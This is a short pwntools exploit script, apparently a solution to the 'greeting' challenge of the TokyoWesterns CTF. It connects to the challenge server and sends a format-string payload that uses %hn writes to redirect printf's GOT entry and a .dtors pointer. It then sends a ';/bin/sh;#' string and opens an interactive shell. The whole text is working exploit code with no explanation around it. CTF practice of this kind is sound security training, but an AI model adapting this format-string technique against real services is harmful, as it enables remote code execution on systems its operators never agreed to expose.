from pwn import *

#s = process("./greeting-1da3bd8f02ee33a89b6f998afbbcc55de162d88c95dbe6a8724aaaea7671cb4c")

s = remote("pwn2.chal.ctf.westerns.tokyo", 16317)
s.recvuntil("...")

# 0x8049A38 = 0x08048490
# 0x8049934 = 0x080485ED
w0 = 0x0804
w1 = 0x8490
w2 = 0x85ed
printfaddr = 0x8049A38
dtoraddr = 0x8049934
s.sendline("AA"+p32(printfaddr+2)+p32(printfaddr)+p32(dtoraddr)+("%%.%du" % (w0-0x18-8)) +"%12$hn" + ("%%.%du" % (w1-w0))+"%13$hn" + ("%%.%du" % (w2-w1))+ "%14$hn")

s.sendline(";/bin/sh;#")
s.interactive()
